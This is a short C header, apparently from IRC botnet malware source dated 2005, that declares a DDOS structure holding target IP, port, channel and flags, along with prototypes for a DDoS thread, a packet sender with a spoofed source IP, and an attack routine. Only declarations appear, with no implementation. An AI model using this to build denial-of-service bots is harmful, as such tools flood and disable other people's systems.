/*****************************************************************************/
/*                                Morgan Copy Right 2005 
/*****************************************************************************/  
#ifndef NO_DDOS 
typedef struct DDOS {

	SOCKET sock;
	int threadnum;
	char ip[128];
	char port[128];
	char length[128];
	char chan[128];
	char type[128];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} DDOS;

DWORD WINAPI DDOSThread(LPVOID param);
long SendDDOS(unsigned long TargetIP, unsigned int SpoofingIP, char *Type, unsigned short TargetPort,int Times);
long DDOSAttack(char *target, char *port, char *type, char *len);
#endif
